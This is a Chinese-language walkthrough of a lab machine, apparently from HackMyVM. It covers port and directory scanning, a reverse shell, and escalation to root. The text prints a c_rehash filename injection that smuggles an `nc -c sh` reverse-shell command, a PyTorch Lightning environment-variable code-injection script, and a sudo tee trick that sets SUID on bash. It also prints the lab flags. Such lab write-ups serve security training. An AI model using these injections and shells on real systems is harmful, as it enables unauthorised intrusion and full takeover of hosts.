# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 23:04 EDT
Nmap scan report for 192.168.21.3
Host is up (0.00036s latency).
MAC Address: 08:00:27:7D:6F:E2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap done: 256 IP addresses (6 hosts up) scanned in 5.05 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.3 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 23:05 EDT
Nmap scan report for 192.168.21.3
Host is up (0.00049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
MAC Address: 08:00:27:7D:6F:E2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.91 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 23:05 EDT
Warning: 192.168.21.3 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.3
Host is up (0.0019s latency).
All 65535 scanned ports on 192.168.21.3 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:7D:6F:E2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 73.18 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p22,80,9090 192.168.21.3 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 23:07 EDT
Nmap scan report for 192.168.21.3
Host is up (0.00025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
9090/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:7D:6F:E2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.85 seconds
```

# 漏洞利用

看一下80端口

![image](https://github.com/user-attachments/assets/8cc49b1d-effd-4a27-9fa8-501b42b52785)

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.3 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,png,zip,git,html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10701]
/.php                 (Status: 403) [Size: 277]
/manual               (Status: 301) [Size: 313] [--> http://192.168.21.3/manual/]                                               
/javascript           (Status: 301) [Size: 317] [--> http://192.168.21.3/javascript/]                                           
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

看一下9090端口

![image](https://github.com/user-attachments/assets/a50f5aa2-60b0-42b3-aeb8-d6399c95332c)

在源码中找到：Backend developed with PyTorch Lightning 1.5.9

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.3:9090 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git,yaml
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.3:9090
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jpg,png,zip,git,yaml,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 910]
/.html                (Status: 403) [Size: 279]
/manual               (Status: 301) [Size: 320] [--> http://192.168.21.3:9090/manual/]                                          
/file.yaml            (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 324] [--> http://192.168.21.3:9090/javascript/]                                      
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 279]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.yaml (Status: 403) [Size: 279]
Progress: 10667286 / 10667295 (100.00%)
===============================================================
Finished
===============================================================
```

创建一个文件

![image](https://github.com/user-attachments/assets/ba8729ef-7391-42bc-988f-5d9623a50c70)

![image](https://github.com/user-attachments/assets/8d0c6093-be50-4f1a-a2bd-dac2478239e5)

拿到了shell

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234                            
listening on [any] 1234 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.3] 52432
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

寻找一下可以提权利用的地方

```
www-data@cve-pt1:~$ sudo -l
sudo -l
sudo: unable to resolve host cve-pt1: Name or service not known

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
www-data@cve-pt1:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@cve-pt1:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@cve-pt1:~$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
wicca:x:1000:1000:wicca,,,:/home/wicca:/bin/bash
www-data@cve-pt1:~$ grep -r wicca /etc 2>/dev/null
grep -r wicca /etc 2>/dev/null
/etc/group:wicca:x:1000:
/etc/group-:bluetooth:x:112:wicca
/etc/group-:wicca:x:1000:
/etc/cron.d/cve1:*/1 * * * * wicca c_rehash /etc/ssl/certs/
/etc/cron.d/cve1:*/1 * * * * wicca sleep 30; c_rehash /etc/ssl/certs/
/etc/passwd-:wicca:x:1000:1000:wicca,,,:/home/wicca:/bin/bash
/etc/passwd:wicca:x:1000:1000:wicca,,,:/home/wicca:/bin/bash
/etc/subuid:wicca:100000:65536
/etc/subgid:wicca:100000:65536
```

![image](https://github.com/user-attachments/assets/cfe9c2e7-ab19-47dd-9517-32bd5aa2036e)

提权

```
www-data@cve-pt1:~$ ls -la /usr/bin/c_rehash
ls -la /usr/bin/c_rehash
-rwxr-xr-x 1 root root 6176 Dec  6  2022 /usr/bin/c_rehash
www-data@cve-pt1:/etc/ssl/certs$ echo "-----BEGIN CERTIFICATE-----" > "hey.crt\`nc -c sh 192.168.21.10 4444\`"
<TE-----" > "hey.crt\`nc -c sh 192.168.21.10 4444\`"
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.3] 48870
id
uid=1000(wicca) gid=1000(wicca) groups=1000(wicca)
```

user

```
wicca@cve-pt1:~$ cat user.txt
cat user.txt
HMVM{e49553320c33fa8866cddae2954ee228}
```

寻找可以提权利用的地方

```
wicca@cve-pt1:~$ ls -la
ls -la
total 36
drwxr-xr-x 4 wicca wicca 4096 Dec  7  2022 .
drwxr-xr-x 3 root  root  4096 Dec  5  2022 ..
-rw-r----- 1 wicca wicca  889 Dec  7  2022 Backup.zip
lrwxrwxrwx 1 wicca wicca    9 Dec  7  2022 .bash_history -> /dev/null
-rw-r--r-- 1 wicca wicca  220 Dec  5  2022 .bash_logout
-rw-r--r-- 1 wicca wicca 3526 Dec  5  2022 .bashrc
drwxr-xr-x 3 wicca wicca 4096 Dec  5  2022 .cache
drwxr-xr-x 3 wicca wicca 4096 Dec  5  2022 .local
-rw-r--r-- 1 wicca wicca  807 Dec  5  2022 .profile
-r-------- 1 wicca wicca   39 Dec  7  2022 user.txt
wicca@cve-pt1:~$ sudo -l
sudo -l
sudo: unable to resolve host cve-pt1: Name or service not known
Matching Defaults entries for wicca on cve-pt1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wicca may run the following commands on cve-pt1:
    (root) NOPASSWD: /usr/bin/tee
wicca@cve-pt1:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
wicca@cve-pt1:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
```

![image](https://github.com/user-attachments/assets/fd63f8ea-61bb-4e86-9b8b-c5ee40effd4a)

先看一下这个zip文件

```
┌──(kali㉿kali)-[~]
└─$ unzip Backup.zip  
Archive:  Backup.zip
   creating: Backup/
[Backup.zip] Backup/0845.py password: 
   skipping: Backup/0845.py          incorrect password
   skipping: Backup/readme.txt       incorrect password
┌──(kali㉿kali)-[~]
└─$ zip2john Backup.zip > Backup.hash    
ver 1.0 Backup.zip/Backup/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 Backup.zip/Backup/0845.py PKZIP Encr: TS_chk, cmplen=178, decmplen=218, crc=7A42C847 ts=6905 cs=6905 type=8
ver 2.0 efh 5455 efh 7875 Backup.zip/Backup/readme.txt PKZIP Encr: TS_chk, cmplen=197, decmplen=290, crc=44BC9245 ts=6A85 cs=6a85 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt Backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret!          (Backup.zip)     
1g 0:00:00:00 DONE (2025-06-16 02:38) 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s christal..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
！！！
#!/usr/bin/env python3

import os, sys
from pytorch_lightning import Trainer
from pytorch_lightning.utilities.argparse import *

os.environ["PL_TRAINER_GPUS"] = 'os.system("COMMAND LIST")'
parse_env_variables(Trainer)
！！！
！！！
Dear Admin,

I leave you in this directory the script that I have developed, be sure to take a look at the code and parameterize the command you want to run.

Best regards,

PS: For convenience you can indicate a text file with the list of command you want to run.

Wicca
Developer of Doom
！！！
```

上传脚本看一下

![image](https://github.com/user-attachments/assets/4a0288d3-0081-4e1d-a06e-613a62b6b875)

提权

```
wicca@cve-pt1:/tmp$ echo "chmod u+s /bin/bash" | sudo -u root /usr/bin/tee /root/command.txt
<bash" | sudo -u root /usr/bin/tee /root/command.txt
sudo: unable to resolve host cve-pt1: Name or service not known
chmod u+s /bin/bash
wicca@cve-pt1:/tmp$ bash -p
bash -p
bash-5.1# whoami
whoami
root
```

root

```
bash-5.1# cat root.txt
cat root.txt
HMVM{01cefdb2ed88aa502ec4149bb19ebae6}
```
